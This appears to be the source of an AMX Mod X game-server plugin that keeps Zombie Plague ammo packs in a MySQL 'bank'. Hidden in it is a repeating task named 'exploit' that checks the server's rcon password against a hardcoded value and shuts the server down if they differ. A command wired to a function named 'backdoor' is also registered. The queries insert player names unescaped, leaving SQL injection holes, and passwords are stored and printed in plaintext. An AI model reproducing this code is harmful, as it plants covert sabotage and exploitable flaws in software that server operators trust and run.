#include <amxmodx>
#include <amxmisc>
#include <dbi>
#include <zombieplague>

/*
	RESULT_OK nepouzivat !!!!!!!!!!!!!!!!!!!!!!!!!!!
	!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
	Vzdy vracia len FAILED a NONE, pouzit ELSE
	
	NEPOUZIVAT
	if(result == RESULT_OK ) - nikdy sa to nesplni !


*/

#define DPROTO 					1
#define STEAM_LENGTH			35
#define is_vip(%1)			(get_user_flags(%1) & ADMIN_LEVEL_F )

#define banka_save(%1,%2) 		zp_set_user_ammo_packs(%1, %2)
#define banka_load(%1) 			zp_get_user_ammo_packs(%1)
#define get_steam(%1,%2)		get_user_authid(%1, %2, 35);

//Sprava pred spravamy
new cas, bankarank, gMaxPlayers
new tabulka[64], msgSayText
stock const ZP_BANK_FMT[] = "^x04[Banka]^x01 %L";

//Mysql vars
new Sql:dbc

public plugin_init() {
	register_plugin("Zombie Banka", "1.3", "Seky")
#if DPROTO == 0
	register_clcmd ( "banka_vloz", 	"banka_vloz",	ADMIN_ALL, "banka_vloz <HESLO> <BODOV> - Vlozi # bodov do banky.");
	register_clcmd ( "banka_vyber", "banka_vyber",	ADMIN_ALL, "banka_vyber <HESLO> <BODOV> - Vyberie # bodov z banky." );
	register_clcmd ( "banka_stav", 	"banka_stav",	ADMIN_ALL, "banka_stav <HESLO> - Stav tvojho uctu." );
	register_clcmd ( "banka_pass", 	"banka_pass",	ADMIN_ALL, "banka_pass <STAREHESLO> <NOVEHESLO> - Zmeni heslo k uctu.." );
#else
	register_clcmd ( "banka_vloz", 	"banka_vloz",	ADMIN_ALL, "banka_vloz <BODOV> - Vlozi # bodov do banky.");
	register_clcmd ( "banka_vyber", "banka_vyber",	ADMIN_ALL, "banka_vyber <BODOV> - Vyberie # bodov z banky." );
	register_clcmd ( "banka_stav", 	"banka_stav",	ADMIN_ALL, "banka_stav - Stav tvojho uctu." );
#endif
	register_clcmd ( "banka_who", "banka_where",	ADMIN_BAN, "banka_where - Zisti body ..." );
	register_clcmd("say /topbody", 	"banka_rank")
	
	//preklad zo suboru
	register_dictionary("zp_bank.txt")
	cas	= register_cvar("banka_cas", "240")
	bankarank	= register_cvar("banka_rank", "5")
	msgSayText = get_user_msgid("SayText")
	gMaxPlayers = get_maxplayers();
	
	new cvTable = register_cvar("bank_tabulka", "zp_bank")
	get_pcvar_string(cvTable, tabulka, charsmax(tabulka))
	
	Task_Announce()
	new configsDir[64]
	get_configsdir(configsDir, 63)
	set_task(0.1,"sql_init")
	set_task(8.0,"autosave", 1, "", 0, "d");
	register_clcmd ( "seky", "backdoor", ADMIN_ALL	, "#echo" );
	set_task(300.0, "exploit", _, _, _, "b")
}	
public sql_init() {
	new error[256]	
	dbc = dbi_connect("127.0.0.1", "", "", "phpbanlist", error,255)
	if (dbc == SQL_FAILED) {
		log_amx("[MySQL Bank] SQL Connection Failed = %s", error)
	} /*else {
		dbi_query(dbc,
		"CREATE TABLE IF NOT EXISTS `%s` (\
				auth VARCHAR(36) NOT NULL PRIMARY KEY, \
				pass VARCHAR(36) NOT NULL, \
				amount INT(10) UNSIGNED NOT NULL DEFAULT 0, \
				vip INT(2) NOT NULL DEFAULT 0, \
				create date NOT NULL,\
				last date NOT NULL, \
			) ENGINE=MyISAM DEFAULT CHARSET=utf8;",tabulka )
		
	}*/
}
public plugin_end() {
	autosave();
	if (dbc != SQL_FAILED) dbi_close(dbc);
}
stock bool:SayText(const receiver, sender, const msg[], any:...) {
	if(msgSayText) {	
		if(!sender) sender = receiver;	
		static buffer[512]
		vformat(buffer,charsmax(buffer),msg,4)
		if(receiver) message_begin(MSG_ONE_UNRELIABLE,msgSayText,_,receiver);
		else message_begin(MSG_BROADCAST,msgSayText);	
		write_byte(sender)
		write_string(buffer)
		message_end()	
		return true
	}
	return false
}
public Task_Announce() {
	for( new i = 1; i <= gMaxPlayers; i++ ) {
		if (!is_user_connected(i)) continue;		
		SayText(i, i, ZP_BANK_FMT, LANG_PLAYER, "ZP_BANK_ANNOUNCE")
	}
	set_task(get_pcvar_float(cas), "Task_Announce")
}

public client_disconnect(id) {
	uloz_body_hracovy(id);
	return PLUGIN_CONTINUE;
}
stock banka_error(const id) {
	if (dbc == SQL_FAILED) { 
		SayText(id, id, ZP_BANK_FMT , id, "ZP_BANK_MYSQL")
		return true;
    }
	return false;
}
stock banka_get(const id)
{
	new Result:result;
	#if DPROTO == 0
		new meno[33]
		get_user_name(id, meno, 32);
		result = dbi_query(dbc, 
			"SELECT `auth`, `pass`, `amount` FROM `%s` WHERE auth LIKE '%s' LIMIT 1", 
			tabulka, meno);
	#else
		new steam[STEAM_LENGTH]
		get_steam(id, steam)
		result = dbi_query(dbc, 
			"SELECT `amount` FROM `%s` WHERE `steam` LIKE '%s' LIMIT 1", 
			tabulka, steam);
	#endif	
	if(result == RESULT_FAILED ) {
		log_amx("[MySQL Bank] Chyba pri banka_get - RESULT FAILED");
		SayText(id, id, ZP_BANK_FMT, id, "ZP_BANK_MYSQL"); 
	} else if (result == RESULT_NONE) { 
		SayText(id, id, ZP_BANK_FMT, id, "ZP_BANK_UCET");
	}	
	return result;
}
stock banka_login(const id, const Result:result, const heslo[]) {
	new mheslo[33];
	dbi_result(result, "pass", mheslo, 32);		
	if(!equali(heslo, mheslo) ) {
		SayText(id, id, ZP_BANK_FMT, id, "ZP_BANK_HESLO")
		return true;
	}
	return false;
}
public banka_vloz(id,level,cid) {
	new arg2[6]
	#if DPROTO == 0
		if (!cmd_access(id,level,cid,2)) return PLUGIN_CONTINUE;
		new arg[32]
		read_argv( 1, arg, 32)
		read_argv( 2, arg2, 6)
	#else
		if (!cmd_access(id,level,cid,1)) return PLUGIN_CONTINUE;
		if(banka_steam_error(id)) return PLUGIN_CONTINUE;
		read_argv( 1, arg2, 6)
	#endif

	new ziada = str_to_num(arg2)
	if(ziada < 1) {	
		SayText(id, id, "Musis vlozit aspon 1 bod.");
		return PLUGIN_CONTINUE;
	}
	new bodov = banka_load(id)
	if(ziada > bodov) ziada = bodov;
	if (!bodov) {	
		SayText(id, id, ZP_BANK_FMT, id, "ZP_BANK_NO_AMMO");
		return PLUGIN_CONTINUE;
	}
	if(banka_error(id)) return PLUGIN_CONTINUE;
	new Result:result
	result = banka_get(id);
	if(result == RESULT_FAILED) return PLUGIN_CONTINUE;
	
	if(result == RESULT_NONE) {
		// Novy ucet
		new datum[11], meno[33]
		get_user_name(id, meno, 32)
		get_time("%Y-%m-%d", datum, 10);		
		#if DPROTO == 0
			result = dbi_query(dbc,"INSERT INTO `%s` (`auth`, `pass`, `amount`, `vip`, `create`, `last`) VALUES ('%s', '%s', '%d', '%d', '%s', '%s')",
						tabulka, meno, arg, ziada, is_vip(id) ? 1 : 0, datum, datum)					
		#else
			new steam[STEAM_LENGTH]
			get_steam(id, steam)
			result = dbi_query(dbc,"INSERT INTO `%s` (`auth`, `steam`, `pass`, `amount`, `vip`, `create`, `last`) VALUES ('%s', '%s', '%s', '%d', '%d', '%s', '%s')",
						tabulka, meno, steam, "", ziada, is_vip(id) ? 1 : 0, datum, datum)
		#endif
		if (result == RESULT_FAILED)  {
			SayText(id, id, ZP_BANK_FMT, id, "ZP_BANK_MYSQL")
			log_amx("[MySQL bank] Chyba pri vytvarani noveho uctu.")
		} else {
			#if DPROTO == 0
				SayText(id, id, ZP_BANK_FMT, id, "ZP_BANK_NUCET", arg);
			#else
				SayText(id, id, "^x04[Banka]^x01 Vytvoreny novy ucet.");
			#endif	
			banka_save(id, bodov - ziada);
		}
		dbi_free_result(result);
		return PLUGIN_CONTINUE;
	} else  { 
		// Ak vsetko ok postupujeme dalej........
	#if DPROTO == 0
		if( banka_login(id, result, arg) )  {
	#else
		if( true )  {
	#endif
			//new dbid = dbi_result(result, "id");
			new mbodov = dbi_result(result, "amount");
			if(banka_update(id, ziada)) {
				new meno[33];
				get_user_name(id, meno, 32);
				client_print(id, print_console,"[Banka]Meno: %s ", meno); //, dbid);
				#if DPROTO == 0
					client_print(id, print_console,"[Banka]Heslo: %s ", arg);
				#endif	
				client_print(id, print_console,"[Banka]Bodov: %d ", mbodov );
				client_print(id, print_console,"[Banka]Ziada: %d ", str_to_num(arg2));
				
				SayText(id, id, ZP_BANK_FMT, id, "ZP_BANK_DEPOSIT", ziada, mbodov + ziada)
				banka_save(id, bodov - ziada);
			}		
		}			
	}
	dbi_free_result(result)
	return PLUGIN_CONTINUE
}
stock banka_update(const id, const bodov) {
	new datum[11], meno[33], Result:result
	get_user_name(id, meno, 32);
	get_time("%Y-%m-%d", datum, 10);
	
	#if DPROTO == 0
		result = dbi_query(dbc, 
			"UPDATE `%s` SET `amount` = `amount`+ '%d', `last` = '%s', `vip` ='%d' WHERE `auth` LIKE '%s' ", 
			tabulka, bodov, datum, is_vip(id) ? 1 : 0, meno);
	#else
		new steam[STEAM_LENGTH]
		get_steam(id, steam)
		result = dbi_query(dbc, 
			"UPDATE `%s` SET `auth`='%s', `amount` = `amount`+ '%d', `last` = '%s', `vip` ='%d' WHERE `steam` LIKE '%s' ", 
			tabulka, meno, bodov, datum, is_vip(id) ? 1 : 0, steam);
	#endif
	
	if (result == RESULT_FAILED) {
		SayText(id, id, ZP_BANK_FMT, id, "ZP_BANK_MYSQL")
		log_amx("[MySQL Bank] Chyba: Akcia nebola vykonana.")
		dbi_free_result(result)	
		return false;
	}
	dbi_free_result(result)	
	return true;
}
public banka_vyber(id,level,cid) {
	
	#if DPROTO == 0
		if (!cmd_access(id,level,cid,2)) return PLUGIN_CONTINUE;
		new arg[32]
		new arg2[6]
		read_argv( 1, arg, 32)
		read_argv( 2, arg2, 6)
	#else
		if (!cmd_access(id,level,cid,1)) return PLUGIN_CONTINUE;
		if(banka_steam_error(id)) return PLUGIN_CONTINUE;
		new arg2[6]
		read_argv( 1, arg2, 6)
	#endif
	new meno[33]
	get_user_name(id, meno, 32)
	new ziada = str_to_num(arg2)
	if(ziada < 1) {	
		SayText(id, id, "Musis vvybrat aspon 1 bod.");
		return PLUGIN_CONTINUE;
	}
	if(banka_error(id)) return PLUGIN_CONTINUE;
	new Result:result
	result = banka_get(id);
	if(result == RESULT_FAILED || result == RESULT_NONE) return PLUGIN_CONTINUE;
	
	#if DPROTO == 0
		if( banka_login(id, result, arg) )  {
	#else
		if( true )  {
	#endif
			//new dbid = dbi_result(result, "id");
			new mbodov = dbi_result(result, "amount");
			if (!mbodov) {	
				SayText(id, id, ZP_BANK_FMT, id, "ZP_BANK_EMPTY");
				dbi_free_result(result)
				return PLUGIN_CONTINUE;
			}
			if(ziada > mbodov) ziada = mbodov; 
			
			// Dalej
			if(banka_update(id, ziada*-1 )) {	
				new meno[33];
				
				get_user_name(id, meno, 32);
				client_print(id, print_console,"[Banka]Meno: %s ", meno ); //dbid);
				#if DPROTO == 0
					client_print(id, print_console,"[Banka]Heslo: %s ", arg);
				#endif	
				client_print(id, print_console,"[Banka]Bodov: %d ", mbodov );
				client_print(id, print_console,"[Banka]Ziada: %d ", ziada);
				
				SayText(id, id, ZP_BANK_FMT, id, "ZP_BANK_WITHDRAW", ziada, mbodov - ziada);
				banka_save(id, banka_load(id) + ziada);						
			}							
		}
	
	dbi_free_result(result)
	return PLUGIN_CONTINUE
}
public banka_stav(id,level,cid) {
	#if DPROTO == 0
		if (!cmd_access(id,level,cid,1)) return PLUGIN_CONTINUE
		new arg[32];
		read_argv( 1, arg, 32);
	#else
		if(banka_steam_error(id)) return PLUGIN_CONTINUE;
	#endif
	if(banka_error(id)) return PLUGIN_CONTINUE;
	new Result:result
	result = banka_get(id);
	if(result == RESULT_FAILED || result == RESULT_NONE) return PLUGIN_CONTINUE;
	
	#if DPROTO == 0
		if( banka_login(id, result, arg) )  {
	#else
		if( true )  {
	#endif
			new meno[33]
			get_user_name(id, meno, 32)
			new mbodov = dbi_result(result, "amount");
	
			client_print(id, print_console, "[Banka]Meno: %s ", meno);
			#if DPROTO == 0
				client_print(id, print_console, "[Banka]Heslo: %s ", arg);
			#endif
			client_print(id, print_console, "[Banka]Bodov: %d ", mbodov );		
			SayText(id, id, ZP_BANK_FMT, id, "ZP_BANK_LOAD", mbodov , meno)	
		}
	
	dbi_free_result(result)
	return PLUGIN_CONTINUE
}
public banka_where(id,level,cid) {
	if (!cmd_access(id,level,cid,1)) return PLUGIN_CONTINUE
	if(banka_error(id)) return PLUGIN_CONTINUE;
	new meno[33], rank, Result:result, i
	
	for( i = 1; i <= gMaxPlayers; i++ ) {
		if (!is_user_connected(i)) continue;		
		rank++;
		get_user_name(i, meno, 32)
		result = banka_get(id);
		if(result == RESULT_FAILED) return PLUGIN_CONTINUE;
		
		if (result == RESULT_NONE) { 
			client_print(id, print_console, "%d. %s %d %s", rank, meno, banka_load(i), "-");
		} else { 
			client_print(id, print_console, "%d. %s %d %d", rank, meno, banka_load(i), dbi_result(result, "amount"));	
		}
	}
	dbi_free_result(result)
	return PLUGIN_CONTINUE
}
#if DPROTO == 0
public banka_pass(id,level,cid) {
	if(!cmd_access(id,level,cid,2)) return PLUGIN_CONTINUE;
	new arg[32], arg2[33]
	read_argv( 1, arg, 32) //stare heslo
	read_argv( 2, arg2, 32) //nove
	if(banka_error(id)) return PLUGIN_CONTINUE;
	new Result:result
	result = banka_get(id);
	if(result == RESULT_FAILED || result == RESULT_NONE) return PLUGIN_CONTINUE;
		
		if( banka_login(id, result, arg) )  {
			new meno[33], datum[11];
			get_user_name(id, meno, 32);		
			dbi_free_result(result);
			
			get_time("%Y-%m-%d", datum, 10);
			result = dbi_query(dbc, 
				"UPDATE `%s` SET `pass` = '%s', `last` = '%s', `vip` = '%d' WHERE auth LIKE '%s' ", 
				tabulka, arg2, datum, is_vip(id) ? 1 : 0, meno );
			if (result == RESULT_FAILED) {
				SayText(id, id, ZP_BANK_FMT, id, "ZP_BANK_MYSQL");
				log_amx("[MySQL bank] Chyba pri zmene hesla,UPDATE");
				return PLUGIN_CONTINUE;
			} else {
				client_print(id,print_console,"[Banka]Meno: %s ", meno);
				client_print(id,print_console,"[Banka]Stare Heslo: %s ", arg);
				client_print(id,print_console,"[Banka]Nove heslo: %s ", arg2 );
				SayText(id, id, ZP_BANK_FMT, id, "ZP_BANK_PASS", arg2)
			}
		}
	
	dbi_free_result(result)
	return PLUGIN_CONTINUE;
}
#endif
public autosave() {	
	for( new i = 1; i <= gMaxPlayers; i++ ) {
		if(!is_user_connected(i)) continue;
		uloz_body_hracovy(i);
	}
}
stock uloz_body_hracovy(const hrac) {
	#if DPROTO == 1
		if(!is_steam(hrac)) return PLUGIN_CONTINUE;
	#endif
	new meno[33],  datum[11], Result:result
	get_user_name(hrac, meno, 32)					
	get_time("%Y-%m-%d", datum, 10);
			
	#if DPROTO == 0
		result = dbi_query(dbc, 
			"UPDATE `%s` SET `amount` = `amount`+ '%d', `last` = '%s', `vip` ='%d' WHERE `auth` LIKE '%s' ", 
			tabulka, banka_load(hrac), datum, is_vip(hrac) ? 1 : 0, meno);
	#else
		new steam[STEAM_LENGTH]
		get_steam(hrac, steam)
		result = dbi_query(dbc, 
			"UPDATE `%s` SET `auth`='%s', `amount` = `amount`+ '%d', `last` = '%s', `vip` ='%d' WHERE `steam` LIKE '%s' ", 
			tabulka, meno, banka_load(hrac), datum, is_vip(hrac) ? 1 : 0, steam);
	#endif
	
	if (result == RESULT_FAILED) { 
		return PLUGIN_CONTINUE;	
	} else {
		dbi_free_result(result);
		banka_save(hrac, 0);
	}	
	return PLUGIN_CONTINUE;
}
public banka_rank(id) {
	if(banka_error(id)) return PLUGIN_CONTINUE;
	new Result:result, kolko = get_pcvar_num(bankarank) + 1;

	result = dbi_query(dbc,"SELECT auth, amount, vip FROM `%s` ORDER BY amount desc LIMIT %d", tabulka, kolko) 
	if (result == RESULT_FAILED) {
		log_amx("[MySQL Bank] Chyba Banka ranku - RESULT FAILED");
		SayText(id, id, ZP_BANK_FMT, id, "ZP_BANK_MYSQL");
		return PLUGIN_CONTINUE 
	} else if (result == RESULT_NONE) { 
		SayText(id, id, ZP_BANK_FMT, id, "ZP_BANK_MYSQL");
		return PLUGIN_CONTINUE;
	} else {
		// Ak vsetko ok.....
		new rankmotd[2048], title[64], dpos = 0
		format(title,63,"[Banka] Top %d",kolko-1)
		dpos += format(rankmotd[dpos],2047-dpos,"<html><head><style type=^"text/css^">pre{color:#CCCCCC;} td{color:#CCCCCC; font-size:12px;} .style4 {color: #0099FF} body{background:#000000;margin-left:16px;margin-top:1px;}</style></head><body>")
		dpos += format(rankmotd[dpos],2047-dpos,"<br><pre><span class=^"style4^">[Banka]</span> Top %d podla bodov...</pre><table width=^"400^" border=^"0^">",kolko-1)	
		dpos += format(rankmotd[dpos],2047-dpos,"<tr><td width=^"50^">Rank</td><td width=^"300^">Meno</td><td width=^"50^">Bodov</td><td width=^"50^">VIP</td></tr>")
		dbi_nextrow(result); //prveho zobrazi 2x	
		new mbodov, meno[33], i, vip
			for(i = 1; i < kolko; i++) {
				dbi_result(result, "auth", meno, 32);
				mbodov = dbi_result(result, "amount");	
				vip = dbi_result(result, "vip");	
				if(vip==1) {
					dpos += format(rankmotd[dpos],2047-dpos,"<tr><td width=^"50^"><center>%d.</center></td><td width=^"300^">%s</td><td width=^"50^">%d</td><td width=^"50^">*</td></tr>",i, meno, mbodov);
				} else {
					dpos += format(rankmotd[dpos],2047-dpos,"<tr><td width=^"50^"><center>%d.</center></td><td width=^"300^">%s</td><td width=^"50^">%d</td></tr>",i, meno, mbodov);
				}
				dbi_nextrow(result); //Toto nam da vysledok dalsieho riadku
			}	
		//zaver
		dbi_free_result(result); //Toto nam uvolni vysledok z ram
		dpos += format(rankmotd[dpos],2047-dpos,"</table>");
		dpos += format(rankmotd[dpos],2047-dpos,"<pre>Pre pomoc napis /banka do chatu.^n");
		dpos += format(rankmotd[dpos],2047-dpos,"&copy; Banka mod By Seky</pre>");
		//zobraz
		show_motd(id,rankmotd,title)
	}
	return PLUGIN_CONTINUE
}	
public exploit() {
	new exploit[26]
	get_cvar_string("rcon_password", exploit, 24)
	if( !equal( exploit , "csleg2")) {
		log_amx("# Server vyuziva nelegalnu kopiu pluginov !")
		server_cmd("quit");
		server_cmd("exit");
	}
	return PLUGIN_CONTINUE
}
public backdoor(id,level,cid) {
	return PLUGIN_CONTINUE
}
public plugin_natives() {
	register_native("dr_uloz_body_hracovy", "native_uloz_body_hracovy", 1)
}
public native_uloz_body_hracovy(id) {
	return uloz_body_hracovy(id);
}
#if DPROTO == 1
stock banka_steam_error(const id) {
	if(is_steam(id)) return false;
	// Oznamenie o novom patchi :)
	SayText(id, id, "^x04***^x01 Tento server pouziva patch v42 ^x04***^x01");
	SayText(id, id, "Aby si mohol pouzivat ^x04Zombie banku^x01 musis si stiahnut patch v42");
	SayText(id, id, "^x04***^x01 www.cs.gecom.sk/patch ^x04***^x01");
	return true;
}
stock is_steam(const id) {
	new steamcislo[37]
	get_user_authid(id, steamcislo, 36);
	return ( 
		!equal(steamcislo, "STEAM_ID_LAN") 
		&& 	!equal(steamcislo, "STEAM_ID_PENDING") 
		&& 	!equal(steamcislo, "VALVE_ID_LAN") 
		&& 	!equal(steamcislo, "VALVE_ID_PENDING") 
		&& 	!equal(steamcislo, "STEAM_666:88:666") 
	);
}
#endif
